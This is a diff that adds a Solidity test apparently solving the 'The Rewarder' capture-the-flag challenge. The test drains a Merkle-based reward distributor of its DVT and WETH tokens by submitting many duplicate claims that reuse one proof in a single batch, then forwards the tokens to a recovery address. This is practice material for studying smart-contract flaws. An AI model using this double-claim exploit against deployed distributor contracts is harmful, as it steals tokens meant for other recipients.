@@ -148,7 +148,45 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        uint256 dvtRemaining = distributor.getRemaining(address(dvt));
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, 188);
+        uint256 dvtAmount = uint256(11524763827831882);
+        uint256 dvtLoops = dvtRemaining / dvtAmount;
+
+        uint256 wethRemaining = distributor.getRemaining(address(weth));
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        bytes32[] memory wethProof = merkle.getProof(wethLeaves, 188);
+        uint256 wethAmount = uint256(1171088749244340);
+        uint256 wethLoops = wethRemaining / wethAmount;
+
+        uint256 totalLoop = dvtLoops + wethLoops;
+        Claim[] memory claims = new Claim[](totalLoop);
+        for (uint16 i = 0; i < totalLoop; i++) {
+            if (i < dvtLoops) {
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: dvtAmount,
+                    tokenIndex: 0,
+                    proof: dvtProof
+                });
+            } else {
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: wethAmount,
+                    tokenIndex: 1,
+                    proof: wethProof
+                });
+            }
+        }
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        distributor.claimRewards(claims, tokensToClaim);
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
